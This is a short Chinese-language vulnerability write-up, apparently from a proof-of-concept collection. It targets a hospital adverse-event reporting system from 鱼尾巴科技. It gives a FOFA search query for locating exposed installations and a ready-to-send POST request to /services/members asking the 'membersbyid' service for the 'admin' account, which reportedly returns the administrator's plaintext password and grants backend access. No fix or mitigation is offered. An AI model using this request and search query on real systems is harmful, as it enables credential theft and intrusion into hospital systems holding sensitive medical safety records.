# 医疗安全(不良)事件报告系统membersbyid存在信息泄露漏洞

# 一、漏洞简介
鱼尾巴科技专注于医疗质控,为医院提供完整医疗质量解决方案,按照国家卫健委评审标准和中国医院质量安全管理标准,研发了医院等级评审系统、医疗安全(不良)事件报告系统、不良事件管理系统等。其中旗下医疗安全(不良)事件报告系统membersbyid存在信息泄露漏洞，通过该漏洞可获取管理员明文密码进入后台。

# 二、影响版本
+ 医疗安全(不良)事件报告系统

# 三、资产测绘
+ fofa`body="koma.Application"`
+ 特征

![1721306769436-e4a4bc7b-dc51-437f-beba-c4aff1c4db63.png](./img/tu4oTq5Iw6KAViO2/1721306769436-e4a4bc7b-dc51-437f-beba-c4aff1c4db63-530940.png)

# 四、漏洞复现
```plain
POST /services/members HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: JSESSIONID=E24C32CE389D5D5C83F3648A394B8A5E
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 73

{"method":"fetch","params":{"service":"membersbyid","members":["admin"]}}
```

![1721307770067-084b58bd-b8ea-455d-9816-b0a136ec2621.png](./img/tu4oTq5Iw6KAViO2/1721307770067-084b58bd-b8ea-455d-9816-b0a136ec2621-291163.png)

![1721306807514-42e7baa0-a868-43e4-901b-4fc15e64e954.png](./img/tu4oTq5Iw6KAViO2/1721306807514-42e7baa0-a868-43e4-901b-4fc15e64e954-576182.png)



> 更新: 2024-10-22 09:37:51  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zfcngaidiyc37nzg>